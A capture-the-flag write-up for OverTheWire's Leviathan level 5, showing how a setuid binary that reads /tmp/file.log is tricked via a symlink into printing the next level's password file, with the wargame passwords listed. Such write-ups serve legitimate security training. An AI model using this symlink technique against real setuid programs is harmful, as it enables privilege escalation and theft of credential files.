# Level 5

## Challenge Details 

- **CTF:** OverTheWire
- **Category:** Leviathan

## Provided Materials

- username: `leviathan5`
- password: `EKKlTF1Xqs`

## Solution

Let's see what do we have:

```sh
leviathan5@gibson:~$ ls -al
total 36
drwxr-xr-x  2 root       root        4096 Oct  5  2023 .
drwxr-xr-x 83 root       root        4096 Oct  5  2023 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan6 leviathan5 15132 Oct  5  2023 leviathan5
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
```

Let's execute `leviathan5` with `ltrace`:

```sh
leviathan5@gibson:~$ ltrace ./leviathan5 
__libc_start_main(0x8049206, 1, 0xffffd654, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                     = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)               = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
```

It uses `fopen()` on `/tmp/file.log` file. So we can create symlink to `/etc/leviathan_pass/leviathan6`:

```sh
leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@gibson:~$ ./leviathan5 
YZ55XPVk2l
```

## Password

`leviathan6`:`YZ55XPVk2l`

*Created by [bu19akov](https://github.com/bu19akov)*